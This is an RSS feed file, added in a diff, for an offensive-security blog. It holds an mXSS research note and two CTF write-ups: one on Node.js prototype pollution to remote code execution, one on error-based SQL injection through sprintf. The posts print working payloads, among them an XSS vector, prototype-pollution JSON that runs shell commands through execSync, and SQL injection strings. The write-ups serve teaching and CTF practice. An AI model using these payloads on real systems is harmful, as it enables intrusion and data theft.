@@ -1,0 +1,189 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>sleepyud444ng</title><description>offensive security practitioner</description><link>https://legendsice42.github.io/</link><language>en</language><item><title>The Silent Transformation: A Deep Dive into Mutation XSS (mXSS) (unfinished)</title><link>https://legendsice42.github.io/posts/mutation-xss-unfinished/</link><guid isPermaLink="true">https://legendsice42.github.io/posts/mutation-xss-unfinished/</guid><description>Research notes on Mutation XSS, parser mutations, and sanitizer bypass patterns.</description><pubDate>Fri, 13 Feb 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Abstract&lt;/h2&gt;
+&lt;p&gt;In the landscape of web security, Cross-Site Scripting (XSS) is often viewed as a solved problem through the lens of modern sanitization libraries and Content Security Policies (CSP). However, Mutation XSS (mXSS) represents a sophisticated class of vulnerability that subverts these defenses by exploiting the fundamental way browsers parse and reconstruct HTML. This research-focused post explores the mechanics of mXSS, analyzes high-profile case studies from Google and DOMPurify, and outlines the technical nuances that make it one of the most elusive threats in modern application security.&lt;/p&gt;
+&lt;h2&gt;1. Introduction: Beyond Traditional Injection&lt;/h2&gt;
+&lt;p&gt;Traditional XSS relies on a lack of sanitization—an attacker injects a &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag, and the application renders it. Mutation XSS is different. It occurs when a seemingly &quot;safe&quot; HTML string is transformed into an &quot;unsafe&quot; executable script by the browser’s own parser.&lt;/p&gt;
+&lt;p&gt;The core of the issue lies in the normalization and serialization of the Document Object Model (DOM). When a web application takes a string and assigns it to an element&apos;s &lt;code&gt;innerHTML&lt;/code&gt;, the browser doesn&apos;t just display the text; it parses the HTML, builds a DOM tree, and often &quot;corrects&quot; malformed code. This correction process—or mutation—is where the vulnerability hides.&lt;/p&gt;
+&lt;h2&gt;2. The Mechanics of the &quot;Parser Gap&quot;&lt;/h2&gt;
+&lt;p&gt;The vulnerability lifecycle of an mXSS attack typically follows a three-stage process:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Sanitization Phase&lt;/strong&gt;: The input string is passed through a sanitizer (e.g., DOMPurify or a server-side filter). The sanitizer parses the string and finds no dangerous tags or attributes.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Assignment Phase&lt;/strong&gt;: The &quot;clean&quot; string is assigned to a DOM sink like &lt;code&gt;element.innerHTML&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Mutation Phase&lt;/strong&gt;: The browser&apos;s internal parser re-evaluates the string. If the string contains specific inert structures—like those found in SVG or MathML namespaces—the browser may rewrite them into a different format that suddenly becomes active.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;The Round-Trip Problem&lt;/h3&gt;
+&lt;p&gt;A primary driver of mXSS is the Round-Trip Problem. This occurs when the serialized output of a DOM tree differs from the original input in a way that changes the security context.&lt;/p&gt;
+&lt;p&gt;Example pattern:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;svg&amp;gt;&amp;lt;p&amp;gt;&amp;lt;style&amp;gt;&amp;lt;a title=&quot;&amp;lt;/style&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;A sanitizer may treat the embedded payload as inert in one parsing context, while the browser’s subsequent mutation can move parts into an executable HTML context.&lt;/p&gt;
+&lt;h2&gt;3. High-Profile Case Studies&lt;/h2&gt;
+&lt;h3&gt;A. The Google Search &lt;code&gt;&amp;lt;noscript&amp;gt;&lt;/code&gt; Bypass&lt;/h3&gt;
+&lt;p&gt;As detailed by public writeups, Google Search was once affected by an mXSS path involving &lt;code&gt;&amp;lt;noscript&amp;gt;&lt;/code&gt; parsing differences. In many browsers, &lt;code&gt;&amp;lt;noscript&amp;gt;&lt;/code&gt; content is treated differently depending on scripting state, creating a discrepancy between what filtering logic expects and what the browser eventually activates.&lt;/p&gt;
+&lt;h3&gt;B. Bypassing DOMPurify (PortSwigger Research)&lt;/h3&gt;
+&lt;p&gt;Gareth Heyes (PortSwigger) documented multiple bypass patterns where namespace transitions and parser behavior caused security-relevant mutations.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Namespace&lt;/th&gt;
+&lt;th&gt;Example Tags&lt;/th&gt;
+&lt;th&gt;Parsing Logic&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;HTML&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Standard HTML context&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;SVG&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;svg&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;rect&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Foreign-content parsing rules&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;MathML&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;math&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;mtext&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Additional parser transitions&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;A common class of bypasses leverages namespace confusion so that sanitized text in one context becomes an active element in another.&lt;/p&gt;
+&lt;h2&gt;4. Technical Nuance: Escaping Attributes&lt;/h2&gt;
+&lt;p&gt;A key defensive detail is robust escaping of &lt;code&gt;&amp;amp;&lt;/code&gt;, &lt;code&gt;&quot;&lt;/code&gt;, and related characters in attribute contexts. Mutations frequently occur around quote repair and parser normalization. If an attacker can force a context break, they can pivot from attribute data into executable markup.&lt;/p&gt;
+&lt;h2&gt;5. Mitigation Strategies&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Prefer &lt;code&gt;textContent&lt;/code&gt;&lt;/strong&gt;: use &lt;code&gt;textContent&lt;/code&gt; over &lt;code&gt;innerHTML&lt;/code&gt; whenever HTML rendering is unnecessary.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Context-aware sanitization&lt;/strong&gt;: ensure sanitizer config explicitly handles SVG/MathML where applicable.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Trusted Types&lt;/strong&gt;: restrict dangerous sinks to trusted, policy-controlled HTML values.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Keep dependencies current&lt;/strong&gt;: sanitizer and browser behavior evolves; frequent updates are essential.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;6. Personal Research Credits&lt;/h2&gt;
+&lt;p&gt;This synthesis was made possible by technical contributions and public research from:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PentesterLab&lt;/li&gt;
+&lt;li&gt;Acunetix&lt;/li&gt;
+&lt;li&gt;SonarSource&lt;/li&gt;
+&lt;li&gt;PortSwigger Research (including Gareth Heyes)&lt;/li&gt;
+&lt;li&gt;Google Bug Hunters&lt;/li&gt;
+&lt;/ul&gt;
+</content:encoded></item><item><title>Breaking Grad</title><link>https://legendsice42.github.io/posts/breaking-grad/</link><guid isPermaLink="true">https://legendsice42.github.io/posts/breaking-grad/</guid><description>Prototype pollution to RCE in a Node.js CTF challenge.</description><pubDate>Fri, 13 Feb 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Overview&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;Breaking Grad&lt;/code&gt; is a Node.js CTF challenge focused on prototype pollution leading to remote code execution (RCE).&lt;/p&gt;
+&lt;p&gt;The core issue is an unsafe recursive merge in &lt;code&gt;/api/calculate&lt;/code&gt;, which allows attacker-controlled properties to be written into &lt;code&gt;constructor.prototype&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Once polluted, process-level options are abused and execution is triggered through &lt;code&gt;/debug/version&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/posts/breaking-grad/overview.png&quot; alt=&quot;Challenge overview screenshot&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Vulnerable Surface&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;POST /api/calculate&lt;/code&gt;: accepts JSON and merges it using insecure object merge logic.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;GET /debug/version&lt;/code&gt;: starts a Node process via &lt;code&gt;child_process.fork&lt;/code&gt;, which can be influenced by polluted prototype properties.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Even when &lt;code&gt;__proto__&lt;/code&gt; is blocked by a WAF, the same effect is reachable through:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{
+  &quot;constructor&quot;: {
+    &quot;prototype&quot;: {
+      &quot;target_property&quot;: &quot;value&quot;
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Exploitation Path&lt;/h2&gt;
+&lt;h3&gt;1) Pollute prototype with execution controls&lt;/h3&gt;
+&lt;p&gt;Abuse &lt;code&gt;constructor.prototype&lt;/code&gt; to set:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;env.x&lt;/code&gt; with JavaScript payload&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;NODE_OPTIONS&lt;/code&gt; as &lt;code&gt;--require /proc/self/environ&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This causes code in &lt;code&gt;env.x&lt;/code&gt; to run when the process is forked.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/posts/breaking-grad/prototype-payload.png&quot; alt=&quot;Prototype pollution payload&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;2) Enumerate files&lt;/h3&gt;
+&lt;p&gt;Send to &lt;code&gt;/api/calculate&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{
+  &quot;constructor&quot;: {
+    &quot;prototype&quot;: {
+      &quot;env&quot;: {
+        &quot;x&quot;: &quot;console.log(require(\&quot;child_process\&quot;).execSync(\&quot;ls\&quot;).toString())//&quot;
+      },
+      &quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/environ&quot;
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then trigger with &lt;code&gt;GET /debug/version&lt;/code&gt; to list files and find the randomized flag filename.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/posts/breaking-grad/list-files-result.png&quot; alt=&quot;File enumeration result&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;3) Read the flag&lt;/h3&gt;
+&lt;p&gt;Repeat with a second payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{
+  &quot;constructor&quot;: {
+    &quot;prototype&quot;: {
+      &quot;env&quot;: {
+        &quot;x&quot;: &quot;console.log(require(\&quot;child_process\&quot;).execSync(\&quot;cat flag_xxxxx\&quot;).toString())//&quot;
+      },
+      &quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/environ&quot;
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Trigger &lt;code&gt;GET /debug/version&lt;/code&gt; again to retrieve the flag output.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/posts/breaking-grad/flag-result.png&quot; alt=&quot;Flag extraction result&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Why This Works&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Insecure recursive merge&lt;/strong&gt; allows attacker-controlled deep object writes.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Prototype chain abuse&lt;/strong&gt; (&lt;code&gt;constructor.prototype&lt;/code&gt;) affects broad object behavior.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;WAF bypass&lt;/strong&gt; blocks &lt;code&gt;__proto__&lt;/code&gt; but not equivalent prototype paths.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Process spawn abuse&lt;/strong&gt; with &lt;code&gt;NODE_OPTIONS&lt;/code&gt; + environment injection leads to RCE.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;Takeaways&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Never merge untrusted JSON into plain objects without strict key allowlists.&lt;/li&gt;
+&lt;li&gt;Block prototype-related keys (&lt;code&gt;__proto__&lt;/code&gt;, &lt;code&gt;constructor&lt;/code&gt;, &lt;code&gt;prototype&lt;/code&gt;) explicitly.&lt;/li&gt;
+&lt;li&gt;Treat process/environment option surfaces as security boundaries.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;p&gt;Writeup source: https://www.notion.so/Breaking-Grad-27abbbc8b725806a8395e795d9332edd?source=copy_link&lt;/p&gt;
+</content:encoded></item><item><title>Baby Sql</title><link>https://legendsice42.github.io/posts/baby-sql/</link><guid isPermaLink="true">https://legendsice42.github.io/posts/baby-sql/</guid><description>Error-based SQL injection via sprintf() format-specifier abuse.</description><pubDate>Fri, 13 Feb 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Challenge Details&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Name: Baby SQL&lt;/li&gt;
+&lt;li&gt;Difficulty: Medium&lt;/li&gt;
+&lt;li&gt;Focus: SQL Injection (Error-based)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Vulnerability&lt;/h2&gt;
+&lt;p&gt;The target is vulnerable to SQL injection due to unsafe handling of user input passed through PHP &lt;code&gt;sprintf()&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;A crafted format input such as &lt;code&gt;%1$&apos;&lt;/code&gt; can bypass sanitization from &lt;code&gt;addslashes()&lt;/code&gt; / &lt;code&gt;real_escape_string()&lt;/code&gt; by abusing how invalid type specifiers are parsed.&lt;/p&gt;
+&lt;p&gt;This allows closing the quoted context and injecting SQL.&lt;/p&gt;
+&lt;h2&gt;Exploitation Path&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Confirm DB version&lt;/strong&gt; with an error-based payload:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;%1$&apos;)||extractvalue(null,concat(0x7e, version()));#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Enumerate table names&lt;/strong&gt; from &lt;code&gt;information_schema.tables&lt;/code&gt; with &lt;code&gt;limit&lt;/code&gt;:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;%1$&apos;)||extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)));#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Enumerate column names&lt;/strong&gt; from &lt;code&gt;information_schema.columns&lt;/code&gt;:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;%1$&apos;)||extractvalue(null,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&apos;totally_not_a_flag&apos; limit 0,1)));#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Extract data&lt;/strong&gt; from target table:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;%1$&apos;)||extractvalue(null,concat(0x7e,(select * from totally_not_a_flag)));#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Result&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;DB identified as MariaDB&lt;/li&gt;
+&lt;li&gt;Table discovered: &lt;code&gt;totally_not_a_flag&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Flag recovered through error output:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;HTB{h0w_d1d_y0u_f1nd_m3?}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Takeaways&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Never treat format-string APIs as sanitization-safe.&lt;/li&gt;
+&lt;li&gt;Error-based SQLi remains practical when output channels are constrained.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;information_schema&lt;/code&gt; + &lt;code&gt;limit n,1&lt;/code&gt; is reliable when aggregate helpers are blocked.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;p&gt;Writeup source: https://www.notion.so/Baby-Sql-263bbbc8b725809da60bc1a1d5bde782?source=copy_link&lt;/p&gt;
+</content:encoded></item></channel></rss>
